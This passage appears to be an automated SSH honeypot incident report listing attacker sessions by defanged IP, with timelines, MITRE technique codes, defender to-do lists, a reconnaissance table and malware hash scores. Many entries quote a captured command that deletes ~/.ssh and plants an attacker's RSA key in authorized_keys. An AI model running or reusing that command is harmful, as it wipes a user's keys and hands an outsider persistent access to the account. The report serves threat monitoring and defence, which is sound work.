| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:35:27` | `cowrie.session.connect` |
| `2026-04-15 05:35:27` | `cowrie.client.version` |
| `2026-04-15 05:35:28` | `cowrie.client.kex` |
| `2026-04-15 05:35:29` | `cowrie.login.success` |
| `2026-04-15 05:35:29` | `cowrie.session.params` |
| `2026-04-15 05:35:29` | `cowrie.command.input` |
| `2026-04-15 05:35:29` | `cowrie.command.failed` |
| `2026-04-15 05:35:30` | `cowrie.log.closed` |
| `2026-04-15 05:35:30` | `cowrie.session.params` |
| `2026-04-15 05:35:30` | `cowrie.command.input` |
| `2026-04-15 05:35:31` | `cowrie.session.file_download` |
| `2026-04-15 05:35:31` | `cowrie.log.closed` |
| `2026-04-15 05:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d000febe4b68

| Field | Detail |
|---|---|
| **Source IP** | `101.126.54[.]36` |
| **First Seen** | 2026-04-15 05:35 |
| **Last Seen** | 2026-04-15 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:35:37` | `cowrie.session.connect` |
| `2026-04-15 05:35:37` | `cowrie.client.version` |
| `2026-04-15 05:35:37` | `cowrie.client.kex` |
| `2026-04-15 05:35:38` | `cowrie.login.success` |
| `2026-04-15 05:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `101.126.54[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e758995e3c5a

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:38 |
| **Last Seen** | 2026-04-15 05:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:38:23` | `cowrie.session.connect` |
| `2026-04-15 05:38:23` | `cowrie.client.version` |
| `2026-04-15 05:38:24` | `cowrie.client.kex` |
| `2026-04-15 05:38:24` | `cowrie.login.success` |
| `2026-04-15 05:38:25` | `cowrie.session.params` |
| `2026-04-15 05:38:25` | `cowrie.command.input` |
| `2026-04-15 05:38:25` | `cowrie.command.failed` |
| `2026-04-15 05:38:25` | `cowrie.log.closed` |
| `2026-04-15 05:38:25` | `cowrie.session.params` |
| `2026-04-15 05:38:25` | `cowrie.command.input` |
| `2026-04-15 05:38:25` | `cowrie.session.file_download` |
| `2026-04-15 05:38:25` | `cowrie.log.closed` |
| `2026-04-15 05:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb0b1345a6ac

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:38 |
| **Last Seen** | 2026-04-15 05:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:38:27` | `cowrie.session.connect` |
| `2026-04-15 05:38:27` | `cowrie.client.version` |
| `2026-04-15 05:38:27` | `cowrie.client.kex` |
| `2026-04-15 05:38:28` | `cowrie.login.success` |
| `2026-04-15 05:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc38ac961015

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:39 |
| **Last Seen** | 2026-04-15 05:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:39:52` | `cowrie.session.connect` |
| `2026-04-15 05:39:52` | `cowrie.client.version` |
| `2026-04-15 05:39:52` | `cowrie.client.kex` |
| `2026-04-15 05:39:53` | `cowrie.login.success` |
| `2026-04-15 05:39:53` | `cowrie.session.params` |
| `2026-04-15 05:39:53` | `cowrie.command.input` |
| `2026-04-15 05:39:53` | `cowrie.command.failed` |
| `2026-04-15 05:39:53` | `cowrie.log.closed` |
| `2026-04-15 05:39:54` | `cowrie.session.params` |
| `2026-04-15 05:39:54` | `cowrie.command.input` |
| `2026-04-15 05:39:54` | `cowrie.session.file_download` |
| `2026-04-15 05:39:54` | `cowrie.log.closed` |
| `2026-04-15 05:39:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e6c961f6ec5

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:39 |
| **Last Seen** | 2026-04-15 05:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:39:56` | `cowrie.session.connect` |
| `2026-04-15 05:39:56` | `cowrie.client.version` |
| `2026-04-15 05:39:56` | `cowrie.client.kex` |
| `2026-04-15 05:39:57` | `cowrie.login.success` |
| `2026-04-15 05:39:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b63c4c527a12

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:42 |
| **Last Seen** | 2026-04-15 05:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:42:39` | `cowrie.session.connect` |
| `2026-04-15 05:42:39` | `cowrie.client.version` |
| `2026-04-15 05:42:40` | `cowrie.client.kex` |
| `2026-04-15 05:42:40` | `cowrie.login.success` |
| `2026-04-15 05:42:40` | `cowrie.session.params` |
| `2026-04-15 05:42:40` | `cowrie.command.input` |
| `2026-04-15 05:42:40` | `cowrie.command.failed` |
| `2026-04-15 05:42:41` | `cowrie.log.closed` |
| `2026-04-15 05:42:41` | `cowrie.session.params` |
| `2026-04-15 05:42:41` | `cowrie.command.input` |
| `2026-04-15 05:42:41` | `cowrie.session.file_download` |
| `2026-04-15 05:42:41` | `cowrie.log.closed` |
| `2026-04-15 05:42:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77e256f1b0cd

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:42 |
| **Last Seen** | 2026-04-15 05:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:42:43` | `cowrie.session.connect` |
| `2026-04-15 05:42:43` | `cowrie.client.version` |
| `2026-04-15 05:42:43` | `cowrie.client.kex` |
| `2026-04-15 05:42:44` | `cowrie.login.success` |
| `2026-04-15 05:42:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09b836d8d38c

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:45 |
| **Last Seen** | 2026-04-15 05:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:45:25` | `cowrie.session.connect` |
| `2026-04-15 05:45:25` | `cowrie.client.version` |
| `2026-04-15 05:45:25` | `cowrie.client.kex` |
| `2026-04-15 05:45:25` | `cowrie.login.success` |
| `2026-04-15 05:45:26` | `cowrie.session.params` |
| `2026-04-15 05:45:26` | `cowrie.command.input` |
| `2026-04-15 05:45:26` | `cowrie.command.failed` |
| `2026-04-15 05:45:26` | `cowrie.log.closed` |
| `2026-04-15 05:45:26` | `cowrie.session.params` |
| `2026-04-15 05:45:26` | `cowrie.command.input` |
| `2026-04-15 05:45:26` | `cowrie.session.file_download` |
| `2026-04-15 05:45:26` | `cowrie.log.closed` |
| `2026-04-15 05:45:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c352d54b0f88

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:45 |
| **Last Seen** | 2026-04-15 05:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:45:29` | `cowrie.session.connect` |
| `2026-04-15 05:45:29` | `cowrie.client.version` |
| `2026-04-15 05:45:29` | `cowrie.client.kex` |
| `2026-04-15 05:45:29` | `cowrie.login.success` |
| `2026-04-15 05:45:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cadfe426696

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:46 |
| **Last Seen** | 2026-04-15 05:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:46:48` | `cowrie.session.connect` |
| `2026-04-15 05:46:48` | `cowrie.client.version` |
| `2026-04-15 05:46:48` | `cowrie.client.kex` |
| `2026-04-15 05:46:49` | `cowrie.login.success` |
| `2026-04-15 05:46:49` | `cowrie.session.params` |
| `2026-04-15 05:46:49` | `cowrie.command.input` |
| `2026-04-15 05:46:49` | `cowrie.command.failed` |
| `2026-04-15 05:46:49` | `cowrie.log.closed` |
| `2026-04-15 05:46:50` | `cowrie.session.params` |
| `2026-04-15 05:46:50` | `cowrie.command.input` |
| `2026-04-15 05:46:50` | `cowrie.session.file_download` |
| `2026-04-15 05:46:50` | `cowrie.log.closed` |
| `2026-04-15 05:46:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e065715b6544

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:46 |
| **Last Seen** | 2026-04-15 05:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:46:52` | `cowrie.session.connect` |
| `2026-04-15 05:46:52` | `cowrie.client.version` |
| `2026-04-15 05:46:52` | `cowrie.client.kex` |
| `2026-04-15 05:46:53` | `cowrie.login.success` |
| `2026-04-15 05:46:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-809c7477e1b5

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:49 |
| **Last Seen** | 2026-04-15 05:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:49:28` | `cowrie.session.connect` |
| `2026-04-15 05:49:28` | `cowrie.client.version` |
| `2026-04-15 05:49:28` | `cowrie.client.kex` |
| `2026-04-15 05:49:29` | `cowrie.login.success` |
| `2026-04-15 05:49:29` | `cowrie.session.params` |
| `2026-04-15 05:49:29` | `cowrie.command.input` |
| `2026-04-15 05:49:29` | `cowrie.command.failed` |
| `2026-04-15 05:49:29` | `cowrie.log.closed` |
| `2026-04-15 05:49:30` | `cowrie.session.params` |
| `2026-04-15 05:49:30` | `cowrie.command.input` |
| `2026-04-15 05:49:30` | `cowrie.session.file_download` |
| `2026-04-15 05:49:30` | `cowrie.log.closed` |
| `2026-04-15 05:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47642b0219e9

| Field | Detail |
|---|---|
| **Source IP** | `196.199.40[.]4` |
| **First Seen** | 2026-04-15 05:49 |
| **Last Seen** | 2026-04-15 05:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 05:49:32` | `cowrie.session.connect` |
| `2026-04-15 05:49:32` | `cowrie.client.version` |
| `2026-04-15 05:49:32` | `cowrie.client.kex` |
| `2026-04-15 05:49:33` | `cowrie.login.success` |
| `2026-04-15 05:49:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.199.40[.]4` to AbuseIPDB if not already reported
- [ ] Block `196.199.40[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `106.37.72[.]234` | **27** | 2026-04-15 05:22 | 2026-04-15 05:36 | 44m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.120[.]138` | **27** | 2026-04-15 04:11 | 2026-04-15 04:31 | 44m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.54[.]36` | **25** | 2026-04-15 05:23 | 2026-04-15 05:37 | 23m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `196.199.40[.]4` | **25** | 2026-04-15 05:21 | 2026-04-15 05:57 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.153.12[.]68` | **25** | 2026-04-15 04:09 | 2026-04-15 04:25 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `46.188.119[.]26` | **25** | 2026-04-15 04:08 | 2026-04-15 04:38 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.114[.]205` | **18** | 2026-04-15 04:11 | 2026-04-15 05:14 | 16m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `18.218.118[.]203` | **5** | 2026-04-15 04:19 | 2026-04-15 04:26 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.89[.]35` | **3** | 2026-04-15 02:50 | 2026-04-15 04:13 | 6m | 0 | `T1592` | 🟢 LOW |
| `101.36.107[.]152` | **2** | 2026-04-15 03:23 | 2026-04-15 03:30 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.133.52[.]228` | **2** | 2026-04-15 02:50 | 2026-04-15 02:53 | 4m | 0 | `T1592` | 🟢 LOW |
| `172.202.113[.]3` | **2** | 2026-04-15 05:42 | 2026-04-15 05:43 | 0m | 0 | `T1592` | 🟢 LOW |
| `60.178.13[.]241` | **2** | 2026-04-15 04:09 | 2026-04-15 04:11 | 4m | 0 | `T1592` | 🟢 LOW |
| `106.12.157[.]104` | 1 | 2026-04-15 05:23 | 2026-04-15 05:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]233` | 1 | 2026-04-15 05:25 | 2026-04-15 05:25 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.117[.]141` | 1 | 2026-04-15 05:23 | 2026-04-15 05:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]194` | 1 | 2026-04-15 04:09 | 2026-04-15 04:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.84[.]166` | 1 | 2026-04-15 04:09 | 2026-04-15 04:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.170[.]54` | 1 | 2026-04-15 02:51 | 2026-04-15 02:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `164.90.138[.]136` | 1 | 2026-04-15 05:22 | 2026-04-15 05:22 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `179.124.29[.]29` | 1 | 2026-04-15 05:08 | 2026-04-15 05:10 | 101s | 1 | `T1110.001` | 🟢 LOW |
| `180.184.82[.]249` | 1 | 2026-04-15 04:10 | 2026-04-15 04:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `187.51.208[.]158` | 1 | 2026-04-15 05:26 | 2026-04-15 05:26 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `206.190.192[.]136` | 1 | 2026-04-15 03:49 | 2026-04-15 03:50 | 13s | 0 | `T1592` | 🟢 LOW |
| `58.222.244[.]226` | 1 | 2026-04-15 04:10 | 2026-04-15 04:10 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.82.70[.]133` | 1 | 2026-04-15 03:09 | 2026-04-15 03:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.23.30[.]215` | 1 | 2026-04-15 04:08 | 2026-04-15 04:08 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
